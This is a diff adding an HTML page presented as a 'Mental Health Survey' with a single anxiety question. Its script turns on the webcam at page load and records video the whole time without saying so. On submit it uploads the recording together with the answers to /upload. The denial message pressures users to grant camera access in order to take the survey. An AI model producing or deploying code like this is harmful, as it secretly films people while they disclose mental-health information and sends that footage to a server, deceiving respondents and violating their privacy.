@@ -1,0 +1,68 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Mental Health Survey</title>
+</head>
+<body>
+  <h2>🧠 Mental Health Survey</h2>
+
+  <form id="survey-form">
+    <label>How often do you feel anxious?</label>
+    <select name="q1">
+      <option>Always</option>
+      <option>Often</option>
+      <option>Sometimes</option>
+      <option>Rarely</option>
+      <option>Never</option>
+    </select><br><br>
+
+    <!-- Add more questions -->
+
+    <button type="submit">Submit</button>
+  </form>
+
+  <div id="camera-status" style="color: red; font-weight: bold; display: none;"></div>
+  <video id="video-preview" width="240" height="180" autoplay muted style="display: none; border: 1px solid #ccc; margin-top: 10px;"></video>
+
+  <script>
+    let mediaRecorder;
+    let videoChunks = [];
+    const videoPreview = document.getElementById('video-preview');
+    const cameraStatus = document.getElementById('camera-status');
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        videoPreview.srcObject = stream;
+        videoPreview.style.display = 'block';
+        cameraStatus.style.display = 'none';
+        mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.ondataavailable = e => videoChunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+          const blob = new Blob(videoChunks, { type: 'video/webm' });
+          const formData = new FormData();
+          formData.append('video', blob);
+          formData.append('answers', JSON.stringify(Object.fromEntries(new FormData(document.getElementById("survey-form")))));
+
+          fetch('/upload', { method: 'POST', body: formData });
+        };
+        mediaRecorder.start();
+      } catch (err) {
+        cameraStatus.textContent = "Camera access denied or blocked. Please allow camera access to proceed with the survey.";
+        cameraStatus.style.display = 'block';
+        videoPreview.style.display = 'none';
+      }
+    }
+
+    startCamera();
+
+    document.getElementById("survey-form").onsubmit = function (e) {
+      e.preventDefault();
+      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+        mediaRecorder.stop();
+      }
+    };
+  </script>
+</body>
+</html>
